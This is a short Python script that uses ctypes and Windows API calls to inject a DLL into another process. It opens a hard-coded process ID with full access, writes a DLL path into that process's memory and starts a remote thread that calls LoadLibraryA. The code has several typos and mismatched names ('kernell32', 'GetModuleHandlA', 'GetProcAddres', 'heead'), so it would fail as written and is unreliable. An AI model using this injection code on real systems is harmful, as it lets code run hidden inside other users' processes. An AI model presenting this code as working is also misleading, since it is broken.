from ctypes import *
from ctypes import wintypes

# constants:
LPCTSTR = c_char_p
SIZE_T = c_size_t
kernell32 = windll.kernel32

# function declerations
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.retype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandlA
GetModuleHandle.argtypes = (LPCTSTR,)
GetModuleHandle.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddres.argtypes = (wintypes.HANDLE, LPCTSTR)
GetProcAddress.restype = wintypes.LPVOID


class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength', wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL), ]


SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID
# threads creation
CreateRemoteThread = kernel32.CreateRemoteThread
# create remote thread uses a security structure pointer
# so, we must implement it
CreateRemoteThread.argtypes = (
    wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD,
    wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

# memory constants
MEM_COMMIT = 0x0001000
MEM_RESERVE = 0x0002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F000 | 0x00100000 | 0x00000FFF)

# ^^^^all functions defined^^^^

dll = b"DLL_PATH"
pid = 2160

handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

if not handle:
    raise WinError()

print("Hnadle Obtained > {0:x}".format(handle))

remote_memory = VirtualAllocEx(handle, False, len(dll)+1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)

if not remote_memory:
    raise WinError()

print("Memory allocated > ", hex(remote_memory))

write = WriteProcessMemory(handle,remote_memory,dll, len(dll)+1, None)

if not write:
    raise WinError()

print("Bytes written {}".format(dll))

load_lib = GetProcAddress( GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")

print("LoadLibrary address =>", heead(load_lib))

rthread = CreateRemoteThread(handle, None, 0 , load_lib,remote_memory,EXECUTE_IMMEDIATELY, None)
